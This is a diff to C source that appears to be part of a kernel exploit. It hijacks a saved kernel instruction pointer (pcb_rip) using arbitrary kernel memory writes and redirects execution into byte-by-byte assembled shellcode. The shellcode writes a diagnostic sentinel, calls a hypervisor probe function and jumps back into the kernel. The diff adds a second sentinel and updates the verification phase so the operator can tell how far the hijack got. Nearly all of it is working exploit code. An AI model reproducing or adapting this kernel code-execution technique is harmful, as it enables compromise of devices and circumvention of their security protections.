@@ -146,8 +146,11 @@
 #define PCB_RIP          0x38
 
 /* kdata persistence locations */
-#define KDATA_SENT_OFF       0x400   /* sentinel — trampoline writes here */
+#define KDATA_SENT_OFF       0x400   /* sentinel — hv_probe writes here */
+#define KDATA_STUB_SENT_OFF  0x408   /* stub sentinel — asm stub writes here (before call) */
 #define KDATA_BACKUP_OFF     0x410   /* backup of original pcb_rip + stub addr */
+
+#define STUB_SENTINEL    0x535455425F524E21ULL  /* "STUB_RN!" */
 
 /* v3 HV probe result locations in kdata */
 #define KDATA_CR0_BEFORE     0x420
@@ -298,20 +301,34 @@ hv_probe(uint64_t kdata_base, uint64_t ktext_probe_addr)
 }
 
 /*
- * Build trampoline stub that calls hv_probe() then jumps to sw_return.
+ * Build trampoline stub that:
+ *   1. Writes STUB_SENTINEL to kdata+0x408 (proof stub itself executed)
+ *   2. Calls hv_probe(kdata_base, ktext_probe_addr)
+ *   3. Jumps to sw_return
+ *
+ * This diagnostic split lets phase 2 distinguish:
+ *   - Neither sentinel → stub never ran (PCB overwrite lost before suspend)
+ *   - Stub sentinel only → stub ran but call to hv_probe failed/crashed
+ *   - Both sentinels → full success
  *
  * Shellcode:
+ *   ; Write stub sentinel (proof the asm stub executed)
+ *   movabs rax, STUB_SENTINEL      ; 10 bytes
+ *   movabs rcx, stub_sent_addr     ; 10 bytes
+ *   mov    [rcx], rax              ; 3 bytes
+ *   ; Call hv_probe(kdata_base, ktext_probe_addr)
  *   movabs rdi, kdata_base         ; 10 bytes  (arg 1)
  *   movabs rsi, ktext_probe_addr   ; 10 bytes  (arg 2)
  *   movabs rax, hv_probe_addr      ; 10 bytes
  *   call   rax                     ; 2 bytes   (FF D0)
+ *   ; Return to kernel
  *   movabs rax, sw_return_addr     ; 10 bytes
  *   jmp    rax                     ; 2 bytes   (FF E0)
  *
- * Total: 44 bytes.
+ * Total: 67 bytes.
  *
  * Register safety:
- *   - rdi, rsi, rax: clobbered (caller-saved, not in PCB)
+ *   - rdi, rsi, rax, rcx: clobbered (caller-saved, not in PCB)
  *   - hv_probe() is a normal C function: preserves rbx, rbp, r12-r15
  *   - rsp: balanced by call/ret pair
  *   - After stub returns to sw_return: all PCB regs intact
@@ -323,6 +340,22 @@ static int build_hv_probe_stub(uint64_t dest, uint64_t kdata_base,
 {
     volatile uint8_t* p = (volatile uint8_t*)dest;
     int i = 0;
+    uint64_t stub_sent_addr = kdata_base + KDATA_STUB_SENT_OFF;
+
+    /* --- Write stub sentinel (diagnostic: did the stub start?) --- */
+
+    /* movabs rax, STUB_SENTINEL */
+    p[i++] = 0x48; p[i++] = 0xB8;
+    for (int b = 0; b < 8; b++) p[i++] = (STUB_SENTINEL >> (b * 8)) & 0xFF;
+
+    /* movabs rcx, stub_sent_addr */
+    p[i++] = 0x48; p[i++] = 0xB9;
+    for (int b = 0; b < 8; b++) p[i++] = (stub_sent_addr >> (b * 8)) & 0xFF;
+
+    /* mov [rcx], rax */
+    p[i++] = 0x48; p[i++] = 0x89; p[i++] = 0x01;
+
+    /* --- Call hv_probe(kdata_base, ktext_probe_addr) --- */
 
     /* movabs rdi, kdata_base */
     p[i++] = 0x48; p[i++] = 0xBF;
@@ -339,6 +372,8 @@ static int build_hv_probe_stub(uint64_t dest, uint64_t kdata_base,
     /* call rax */
     p[i++] = 0xFF; p[i++] = 0xD0;
 
+    /* --- Return to kernel --- */
+
     /* movabs rax, sw_return_addr */
     p[i++] = 0x48; p[i++] = 0xB8;
     for (int b = 0; b < 8; b++) p[i++] = (sw_return_addr >> (b * 8)) & 0xFF;
@@ -346,7 +381,7 @@ static int build_hv_probe_stub(uint64_t dest, uint64_t kdata_base,
     /* jmp rax */
     p[i++] = 0xFF; p[i++] = 0xE0;
 
-    return i;  /* 44 */
+    return i;  /* 67 */
 }
 
 static void phase1_arm(uint64_t kdata_base, uint64_t exec_code,
@@ -436,8 +471,9 @@ static void phase1_arm(uint64_t kdata_base, uint64_t exec_code,
         write8(kdata_base + KDATA_BACKUP_OFF, orig_rip);
         write8(kdata_base + KDATA_BACKUP_OFF + 8, stub_addr);
 
-        /* Clear sentinel and all HV probe result slots */
+        /* Clear sentinels and all HV probe result slots */
         write8(kdata_base + KDATA_SENT_OFF, 0);
+        write8(kdata_base + KDATA_STUB_SENT_OFF, 0);
         for (int off = KDATA_CR0_BEFORE; off <= KDATA_EFER_VAL; off += 8)
             write8(kdata_base + off, 0);
 
@@ -516,8 +552,9 @@ static void phase2_verify(uint64_t kdata_base, volatile uint64_t* out,
 
     /* kdata persistence checks */
     uint64_t sentinel = read8(kdata_base + KDATA_SENT_OFF);
+    uint64_t stub_sent = read8(kdata_base + KDATA_STUB_SENT_OFF);
     out[20] = sentinel;
-    out[21] = read8(kdata_base + 0x200);  /* pcb_diff snap_magic */
+    out[21] = stub_sent;
 
     /* pcb_rip analysis */
     uint64_t backed_up_rip = read8(kdata_base + KDATA_BACKUP_OFF);
